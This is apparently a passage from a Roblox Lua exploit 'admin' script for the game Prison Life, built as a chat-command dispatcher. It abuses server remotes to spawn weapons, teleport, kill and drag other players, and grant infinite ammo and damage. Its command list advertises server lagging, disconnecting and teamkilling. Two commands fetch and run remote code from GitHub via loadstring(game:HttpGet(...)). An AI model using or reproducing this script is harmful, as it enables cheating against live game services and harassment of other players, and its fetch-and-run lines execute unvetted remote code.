game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved

wait(0.6)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Lime green"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
end
			elseif msg:match(prefix .. "rgb off") then
_G.toggle = false

while _G.toggle == true do
wait()
saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Light yellow"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved

wait(0.6)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Bright red"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved

wait(0.6)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Bright yellow"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved

wait(0.6)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Hot pink"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved

wait(0.6)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Plum"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved

wait(0.6)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Crimson"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved

wait(0.6)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Sunrise"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved

wait(0.6)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Really black"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved

wait(0.6)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Lime green"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved

wait(0.6)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Tr. Yellow"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved

wait(0.6)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Bright violet"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved

wait(0.6)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Neon green"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved

wait(0.6)

saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Rust"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
end
	elseif msg:match(prefix .. "walls off") then
    L = game.Lighting
    PH = workspace.Prison_Halls
    PGO = workspace.Prison_Guard_Outpost
    PA = workspace.Prison_Administration
    PCB = workspace.Prison_Cellblock
    CFT = workspace.Prison_Cafeteria
    GA = L.Garages
    PGB = workspace.GuardBooth
    L.walls.Parent = PH
    L.lights.Parent = PH
    L.roof.Parent = PH
    L.glass.Parent = PH
    L.doorwindow.Parent = PGO
    L.wall.Parent = PGO
    L.lights.Parent = PGO
    L.wallsegment.Parent = PGO
    L.wallsegment.Parent = PGO
    L.wallsegment.Parent = PGO
    L.wallsegment.Parent = PGO
    L.wallsegment.Parent = PGO
    L.wallsegment.Parent = PGO
    L.wallsegment.Parent = PGO
    L.part.Parent = PGO
    L.Part.Parent = PGO
    L.walls.Parent = PA
    L.Part.Parent = PA
    L.Part.Parent = PA
    L.Part.Parent = PA
    L.trim.Parent = PA
    L.trim.Parent = PA
    L.trimboi.Parent = PA
    L.front.Parent = PA
    L.b_front.Parent = PCB
    L.b_wall.Parent = PCB
    L.c_wall.Parent = PCB
    L.a_walls.Parent = PCB
    L.a_front.Parent = PCB
    L.c_ceiling.Parent = PCB
    L.a_ceiling.Parent = PCB
    L.b_ceiling.Parent = PCB
    L.a_outerwall.Parent = PCB
    L.b_outerwall.Parent = PCB
    L.a_lights.Parent = PCB
    L.b_lights.Parent = PCB
    L.c_lights.Parent = PCB
    L.Wedge.Parent = PCB
    L.Wedge.Parent = PCB
    L.building.Parent = CFT
    L.lights.Parent = CFT
    L.glassdividers.Parent = CFT
    L.Wedge.Parent = CFT
    L.Wedge.Parent = CFT
    L.Wedge.Parent = CFT
    L.c_hallwall.Parent = PCB
    L.c_hallwall.Parent = PCB
    L.c_hallwall.Parent = PCB
    L.c_hallwall.Parent = PCB
    L.c_corner.Parent = PCB
    L.c_corner.Parent = PCB
    L.c_corner.Parent = PCB
    L.c_corner.Parent = PCB
    L.c_glass.Parent = PCB
    L.Floor.Parent = CFT
    L.Floor.Parent = CFT
    L.Floor.Parent = CFT
    L.Floor.Parent = CFT
    L.Model.Parent = CFT
    L.Model.Parent = CFT
    L.glass.Parent = CFT
    L.window.Parent = PGO
    L.light_floor1.Parent = PA
    L.light_floor2.Parent = PA
    L.Part.Parent = PA
    GA.Parent = workspace
    L.Prison_bollards.Parent = PGB
    L.Wedge.Parent = PGB
    L.Wedge.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Stonewall.Parent = PGB
    L.Part.Parent = PGB
    L.Part.Parent = PGB
    L.Model.Parent = PGB
    L.Model.Parent = PGB
    L.PGBGlass.Parent = PGB
			elseif msg:match(prefix .. "doors on") then
				game.Workspace.Doors.Parent = game.Lighting
				game.Workspace.Prison_Cellblock.doors.Parent = game.Lighting
			elseif msg:match(prefix .. "doors off") then
				game.Lighting.Doors.Parent = game.workspace
				game.Lighting.doors.Parent = workspace.Prison_Cellblock
			elseif msg:match(prefix .. "lock") then
				LocalPlayer.Character.Humanoid.WalkSpeed = 24
				local CIH = game.Players.LocalPlayer.Character.ClientInputHandler
				CIH.Disabled = true
				LocalPlayer.CharacterAdded:Connect(
					function()
						workspace:WaitForChild(LocalPlayer.Name)
						CIH.Disabled = true
					end
				)
			elseif msg:match(prefix .. "punch on") then
				_G.toggle = true

                		while _G.toggle == true do
                		wait()
				local meleeRemote = game.ReplicatedStorage.meleeEvent
				local mouse = LocalPlayer:GetMouse()
				local punching = false
				local cooldown = false

				function punch()
					cooldown = true
					local part = Instance.new("Part")
					part.Parent = LocalPlayer.Character
					part.Transparency = 1
					part.Size = Vector3.new(5, 2, 3)
					part.CanCollide = false
					local w1 = Instance.new("Weld", part)
					w1.Part0 = LocalPlayer.Character.Torso
					w1.Part1 = part
					w1.C1 = CFrame.new(0, 0, 2)

					_G.parttouch =  part.Touched:Connect(
						function(hit)
							if game.Players:FindFirstChild(hit.Parent.Name) then
								local plr = game.Players:FindFirstChild(hit.Parent.Name)
								if plr.Name ~= LocalPlayer.Name then
									part:Destroy()

									for i = 1, 100 do
										meleeRemote:FireServer(plr)
									end
								end
							end
						end
					)
					wait(1)
					cooldown = false
					part:Destroy()
				end


				local OnePunch =
					mouse.KeyDown:Connect(
						function(key)
						if cooldown == false then
							if key:lower() == "f" then
								punch()
							end
						end
					end
					)
				table.insert(onepunchconnection, OnePunch)
				table.insert(onepunchconnection, _G.parttouch)
				end

			elseif msg:match(prefix.."saim") then
				loadstring(game:HttpGet('https://raw.githubusercontent.com/dudeididntliterally/silentaimprisonlife/main/silentaim.txt'))()
			elseif msg:match(prefix .. "slayers") then
				loadstring(game:HttpGet('https://raw.githubusercontent.com/dudeididntliterally/slayersadminnotmine/main/slayersadmin.txt'))()
			elseif msg:match(prefix.."to ") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = findPlr( msg:sub(5) ).Character.HumanoidRootPart.CFrame
			elseif msg:match(prefix.."fix") then
				while wait() do
					if game.Players.LocalPlayer.Character then
						if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
							game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
						end
					end
				end

			elseif msg:match(prefix.."tool") then
				local tool1   = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
				tool1.BinType = "Crude Knife"
			elseif msg:match(prefix .. "al") then
			    local players = game:GetService("Players")
   local rs = game:GetService("RunService")

   rs.RenderStepped:Connect(function()
    pcall(function()
        for i,v in pairs(game.Players:GetChildren()) do
            for i2,v2 in pairs(v.Character:GetDescendants()) do
                if v2.Name == "handcuffedGui" then
                    v2:Destroy()
                        end    
                    end
                end
    end)
    end)
			elseif msg:match(prefix.."weaponia") then
			    			for i = 1, math.huge, 1 do wait (1) pcall(function()
						local j = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
						game.ReplicatedStorage.ReloadEvent:FireServer(j)
						wait(.5) for i, v in next, debug.getregistry() do if type(v) == "table"
						then if v.Bullets then v.CurrentAmmo = 30 v.MaxAmmo = 30 end end end end) end
			elseif msg:match(prefix.."m4") then
				game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
			elseif msg:match(prefix.."ak") then
				game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
			elseif msg:match(prefix.."remi") then
				game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
			elseif msg:match(prefix.."m9") then
				game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)

			elseif msg:match(prefix .. "nolag") then
				for i = 1,99 do
					game.workspace.Prison_ITEMS.clothes.Parent = game.Lighting
				end
			elseif msg:match(prefix .. "clothes") then
				saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
				local tbl_main = 
					{
						game:GetService("Players").LocalPlayer, 
						"Really red"
					}
				game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
				wait(0.001)
				workspace.Remote.TeamEvent:FireServer("Bright orange")
				-- TELEPORTS KILL ME TOOK FOR EVER --
			elseif msg:match(prefix.."nex") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(942.865479, 99.9900055, 2394.74512, 0.999985993, 4.10922052e-09, -0.00528888358, -4.26388658e-09, 1, -2.92323694e-08, 0.00528888358, 2.92545117e-08, 0.999985993)
			elseif msg:match(prefix.."yard") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(807.670471, 98.1899414, 2538.61035, 0.999644995, 1.90885174e-08, 0.0266436562, -2.1869857e-08, 1, 1.04098859e-07, -0.0266436562, -1.04644599e-07, 0.999644995)
			elseif msg:match(prefix.."armory") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(782.77533, 99.9900055, 2312.53613)
			elseif msg:match(prefix.."sewer") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(916.633301, 78.7002792, 2249.14844, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			elseif msg:match(prefix.."cbase") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-913.828125, 94.1287842, 2065.8103, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			elseif msg:match(prefix.."garage") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(615.645264, 98.2000275, 2514.97485, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			elseif msg:match(prefix.."tower") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(824.250122, 130.039948, 2587.96094, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			elseif msg:match(prefix.."bus") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-376.240692, 64.6950378, 1723.92529, 0.619192958, 4.31812142e-09, -0.785238445, 5.83350008e-08, 1, 5.14986844e-08, 0.785238445, -7.76945157e-08, 0.619192958)
			elseif msg:match(prefix.."bridge") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-81.0300827, 11.099329, 1311.87549, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			elseif msg:match(prefix.."store") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(434.462921, 11.4253635, 1183.47156)
			elseif msg:match(prefix.."gas") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-512.839172, 54.3937874, 1666.99426)
			elseif msg:match(prefix.."unmap") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-568.503418, 10.8399124, 1414.12463)
			elseif msg:match(prefix.."cafe") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(924.767944, 99.9899597, 2289.30566)
			elseif msg:match(prefix.."cell") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(915.264282, 99.9899902, 2437.57007)
			elseif msg:match(prefix.."roof") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(827.423523, 118.990005, 2329.62598)
			elseif msg:match(prefix.."gate") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(503.799866, 102.03994, 2252.01831)
			elseif msg:match(prefix.."flag") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(724.799255, 129.352875, 2518.14087, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			elseif msg:match(prefix.."back") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(968.299377, 100.390007, 2325.80688)
			elseif msg:match(prefix.."safe") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-714.745117, 63.1439095, 2577.37939)
			elseif msg:match(prefix.."empty") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-338.030426, 64.572464, 1812.73853)
			elseif msg:match(prefix.."moutain") then
				LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1607.54736, 146.505753, 2702.39282)

			elseif msg:match(prefix.."rj") then
				game.TeleportService:Teleport(game.PlaceId)
			elseif msg:match(prefix .. "scd on") then
_G.toggle = true

while _G.toggle == true do
wait()
local lcd = (game.Players.LocalPlayer.Name)

local userdata_1 = game:GetService("Workspace")["Prison_ITEMS"].buttons["Garage Buttons"].open;
local Target = game:GetService("Workspace").Remote.ItemHandler;
Target:InvokeServer(userdata_1);
wait(0.001)
local userdata_1 = game:GetService("Workspace")["Prison_ITEMS"].buttons["Garage Buttons"].close;
local Target = game:GetService("Workspace").Remote.ItemHandler;
Target:InvokeServer(userdata_1);
wait(0.001)
end
			elseif msg:match(prefix .. "scd off") then
_G.toggle = false

while _G.toggle == true do
wait()
local lcd = (game.Players.LocalPlayer.Name)

local userdata_1 = game:GetService("Workspace")["Prison_ITEMS"].buttons["Garage Buttons"].open;
local Target = game:GetService("Workspace").Remote.ItemHandler;
Target:InvokeServer(userdata_1);
wait(0.001)
local userdata_1 = game:GetService("Workspace")["Prison_ITEMS"].buttons["Garage Buttons"].close;
local Target = game:GetService("Workspace").Remote.ItemHandler;
Target:InvokeServer(userdata_1);
wait(0.001)
end
			elseif msg:match(prefix .. "cbase on") then
                game.Workspace.Warehouses.Parent = game.Lighting
                game.Workspace.Warehouse2.Parent = game.Lighting
                game.Workspace.Warehouse2.Parent = game.Lighting
			elseif msg:match(prefix .. "asa on") then
_G.toggle = true
 
while _G.toggle == true do
wait()
local blah = (game.Players.LocalPlayer.Name)
 
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(916.297546, 99.9900055, 2383.50928)
wait(0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001)
workspace.Remote.TeamEvent:FireServer("Bright blue")
wait(0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(916.297546, 99.9900055, 2383.50928)
wait(0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001)
workspace.Remote.TeamEvent:FireServer("Bright blue")
end
			elseif msg:match(prefix .. "asa off") then
_G.toggle = false
 
while _G.toggle == true do
wait()
local blah = (game.Players.LocalPlayer.Name)
 
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(916.297546, 99.9900055, 2383.50928)
wait(0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001)
workspace.Remote.TeamEvent:FireServer("Bright blue")
wait(0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(916.297546, 99.9900055, 2383.50928)
wait(0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001)
workspace.Remote.TeamEvent:FireServer("Bright blue")
end
			elseif msg:match(prefix .. "cbase off") then
                game.Lighting.Warehouses.Parent = game.workspace
                game.Lighting.Warehouse2.Parent = game.workspace
                game.Lighting.Warehouse2.Parent = game.workspace
			elseif msg:match(prefix.."bring ") then
for i,v in pairs(GetPlayer(msg:sub(8))) do
game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
		local mainhand = game.Players.LocalPlayer.Backpack:FindFirstChild("Remington 870").Handle
		mainhand.Size = Vector3.new(5, 5, 5)
		local NOW = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		game.Players.LocalPlayer.Character.Humanoid.Name = 1
		local l = game.Players.LocalPlayer.Character["1"]:Clone()
		l.Parent = game.Players.LocalPlayer.Character
		l.Name = "Humanoid"
		wait(0.2)
		game.Players.LocalPlayer.Character["1"]:Destroy()
		game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
		wait(0.2)
		game.Players.LocalPlayer.Character.Animate.Disabled = true
		game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
		for i,x in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
		game.Players.LocalPlayer.Character.Humanoid:EquipTool(x)
		end
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
		wait(0.2)
		for i,x in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
		game.Players.LocalPlayer.Character.Humanoid:EquipTool(x)
		end
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
		wait(0.2)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = NOW
		wait(0.01)
		game.Players.LocalPlayer.Character:MoveTo(v.Character.Position)
		wait(0.2)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = NOW
		wait(0.001)
saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local A_1 = "\66\114\111\121\111\117\98\97\100\100"
local Event = game:GetService("Workspace").Remote.loadchar
Event:InvokeServer(A_1)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
end
wait(0.01)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-936.546631, 94.1287842, 1990.08435)
			elseif msg:match(prefix .. "mgun") then
			                   for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                        if v:IsA("Tool") then
                                v.Parent = game.Players.LocalPlayer.Backpack
                        end
                end
                workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
                game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
                wait()
                game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GripPos = Vector3.new(0.1,-0.1,0.3)
                game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GripUp = Vector3.new(0,-500,0)
                game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GripRight = Vector3.new(-500,0,0)
                wait()
                        wait()
                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                        if v:IsA("Tool") then
                                v.Parent = game.Players.LocalPlayer.Backpack
                        end
                end
                local player = game:GetService("Players").LocalPlayer
local gun = player.Backpack:FindFirstChild("Remington 870")
local sM = require(gun:FindFirstChild("GunStates"))
sM["Damage"] = math.huge
sM["MaxAmmo"] = math.huge
sM["CurrentAmmo"] = math.huge
sM["StoredAmmo"] = math.huge
sM["FireRate"] = -math.huge
sM["AmmoPerClip"] = math.huge
sM["Range"] = math.huge
sM["ReloadTime"] = -math.huge
sM["Bullets"] = 8
sM["AutoFire"] = true
wait()
game.Players.LocalPlayer.Backpack["Remington 870"].Parent = game.Players.LocalPlayer.Character
			elseif msg:match(prefix .. "ff on") then
_G.toggle = true

while _G.toggle == true do
wait(0.1)
saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Really red"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
wait()
workspace.Remote.TeamEvent:FireServer("Medium stone grey")
wait(7)
end

			elseif msg:match(prefix .. "ff off") then
_G.toggle = false

while _G.toggle == true do
wait(0.1)
saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
local tbl_main = 
{
      game:GetService("Players").LocalPlayer, 
      "Really red"
}
game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
wait()
workspace.Remote.TeamEvent:FireServer("Medium stone grey")
wait(7)
end
			elseif msg:match(prefix.."crim") then
				function EquipTools()
					for a, b in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
						if b:IsA("Tool") and b.Name == "Bring Gun" then
							b.Parent = game.Players.LocalPlayer.Character
						end
					end
				end
				local function DestroyHum()
					local a = game.Players.LocalPlayer
					if a.Character then
						if a.Character:FindFirstChild("Humanoid") then
							a.Character.Humanoid.Name = "1"
						end
						local b = a.Character["1"]:Clone()
						b.Parent = a.Character
						b.Name = "Humanoid"
						wait(0.1)
						a.Character["1"]:Destroy()
						workspace.CurrentCamera.CameraSubject = a.Character.Humanoid
						a.Character.Animate.Disabled = true
						wait(0.1)
						a.Character.Animate.Disabled = false
					end
				end
				function tp(lol)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = findPlr(lol).Character.HumanoidRootPart.CFrame
				end
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.single["Hammer"].ITEMPICKUP)
				game.Players.LocalPlayer.Backpack["Hammer"].Name = "Bring Gun"
				_startpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
				DestroyHum()
				EquipTools()
				repeat
					wait()
					tp(msg:sub(8))
				until findPlr(tostring(msg:sub(8))).Character:FindFirstChild("Bring Gun")
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-921, 95, 2143)
				wait(.2)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = _startpos
				wait(0.6)
				_startpos2 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
				workspace["Remote"].loadchar:InvokeServer()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = _startpos2
				findPlr(tostring(msg:sub(8))).Character:FindFirstChild("Bring Gun").Name = "ok bet"
			elseif msg:match(prefix.."ab") then
				local char = game.Players.LocalPlayer.Character
				char.Parent = nil
				char.HumanoidRootPart:Destroy()
				char.Parent = workspace
				wait(0.1)
				game:GetService("Workspace").FallenPartsDestroyHeight = math.huge-math.huge
				local val = Instance.new("Part")
				val.Parent = game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool")
				val.Name = "valid"
				wait(0.1)
				game.Players.LocalPlayer.Character.ChildAdded:Connect(function(newtool)
					if not newtool:FindFirstChild("valid") then
						newtool:Destroy()
					end
				end)

			elseif msg:match(prefix .. "cmds") then

				print[[
        Main Commands
        :re - Respawns
        :auto on - AutoRespawn
        :auto off (off AutoRespawn)
        :prefix - ,prefix (NewPrefixHere)
        :nopunch - No Punch
        :saim - silent aim lock
        :lag - LAGS SERVER (on/off)
        :mgun - MINI GUN SHOTGUN - LAGGY ASF
        :lag off - LAGS SERVER (on/off)
        :sg on - open gate (on/off)
        :sg off - open gate (on/off)
        :god on - op godmode (on/off)
        :god off - op godmode (on/off)
        :bring - Brings a player
        :crim - makes you crim
        :to (player) - Tp's to a player
        :end - *DISCONNECTS* SERVER
        :lguns on - Loopguns
        :time - full bright
        :lguns off - unloopguns
        :barcodehub - another free admin
        :fling - flings
        :adonis - fe admin for any game
        :close - Alt + F4
        :weaponia - infinite ammo (DOES WORK NOW)
        :k [i, g, c, all] - Teamkills
        :walls on - on walls
        :fences on - on fences
        :doors on - on doors
        :doors off - off doors
        :fences off - off fences
        :walls off - off walls
        :ring - rings ears and everybody CAN hear it (doesnt bypass anti crash)
        :opguns - mods all guns (might break)
        :asa on - anti spam arrest (on/off)
        :asa off - anti spam arrest (on/off)
        :fix - Camera Fix
        :btools - (delete certain walls)
        :ca - click arrest
        :tk - touch kill (goes away when you reset)
        :ltk - touch kill (does not go away when you reset)
        :asa on - op anti spam arrest (on/off)
        :asa off - op anti spam arrest (on/off)
        :ff on - op ff (on/off)
        :ff off - op ff (on/off)
        :scd on - opens crim door i believe (on/off)
        :scd off - opens crim door i believe (on/off)
        :slayers - a free admin that also they took it down so i put it on here
        :saim - silent aim gui
        :nolag - no swat lag
        :al - anti spam arrest lag
        :ws (number)
        :jp (number)
        :fling - flings everything that touches you
        :invis - invisible as it says
        :kcf - key card finder
        :ka - kill aura (e to toggle)
        :ar all - arrest all crims
        :lock - anti taze
        :chat - chat Bypass
        :punish on (on/off) GOT RID OF TAZE ALL! (does work btw)
        :punish off (on/off) GOT RID OF TAZE ALL! (does work btw)
        :headless - Headless Head
        :noleg - No Legs
        :rgb on - Cycles Colors
        :rgb off - (off) Cycles Colors
        :sagui - not really a good spam arrest but kinda good
        :slayers - slayers admin (kinda rare cuz they took it down)
